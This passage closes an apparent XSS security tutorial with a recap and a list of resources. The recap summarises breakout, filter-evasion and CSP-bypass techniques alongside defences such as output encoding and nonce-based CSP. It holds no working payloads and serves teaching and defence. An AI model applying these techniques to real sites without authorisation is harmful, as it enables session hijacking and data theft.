## 26. Fast Recall

- **XSS** places user-controlled data into a page where the browser executes it as code. Classification **CWE-79**, part of **A05:2025 Injection**.
- Injected script runs **with the privileges of the legitimate page**, in the victim's session.
- **Reflected**: payload in the request, echoed back, affects only users who click the link.
- **Stored**: payload saved server-side, served to every visitor, **most severe**, no interaction needed.
- **DOM-based**: payload never reaches the server, invisible in HTTP traffic and proxies, requires DevTools and JavaScript review.
- The **URL fragment (`#`) is never sent to the server**, which is why DOM XSS evades server-side detection.
- **Context determines the payload.** Identify where the input lands before choosing a payload.
- **Breakouts:** HTML body inject a tag; quoted attribute close the quote then break out or add a handler; JavaScript string close the quote, inject, comment out with `//`.
- **Methodology:** probe with a marker, identify context, confirm which characters survive, execute minimally, then demonstrate impact.
- **Sources:** `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`. **Sinks:** `innerHTML`, `document.write`, `eval`, `setTimeout` with a string, `Function()`.
- **`textContent` is the safe alternative to `innerHTML`.**
- **postMessage** handlers must validate `e.origin` and use a safe sink.
- **Filter evasion** exploits denylist gaps: case variation, alternative tags and handlers, nested tags, entity and double encoding, Unicode normalization after validation.
- **CSP limits impact, it does not fix injection.** `'unsafe-inline'` largely defeats it.
- **The most common CSP bypass** is a JSONP endpoint on an allow-listed domain. Nonce-based policies with `strict-dynamic` avoid host allow-list weaknesses.
- **Output encoding is the fix; input validation is a layer.** Encoding must match the output context.
- **HttpOnly** stops cookie theft via script but not the XSS itself; the attacker can still act as the victim.
- **Modern frameworks auto-escape.** Most XSS in them comes from explicit escape hatches like `dangerouslySetInnerHTML` and `v-html`.
- **`alert(1)` proves the bug; the report needs business impact** to get it fixed.

## 27. Resources

**Prevention and standards**
- [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP: DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP: Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP Top 10:2025 A05 Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
- [MITRE CWE-79](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

**Learning and practice (authorized labs)**
- [PortSwigger Web Security Academy: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger: DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [Google XSS Game](https://xss-game.appspot.com/)

**Content Security Policy**
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [MDN: Trusted Types](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)

**Defensive libraries**
- [DOMPurify](https://github.com/cure53/DOMPurify)

**Tools**
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Chrome DevTools documentation](https://developer.chrome.com/docs/devtools/)
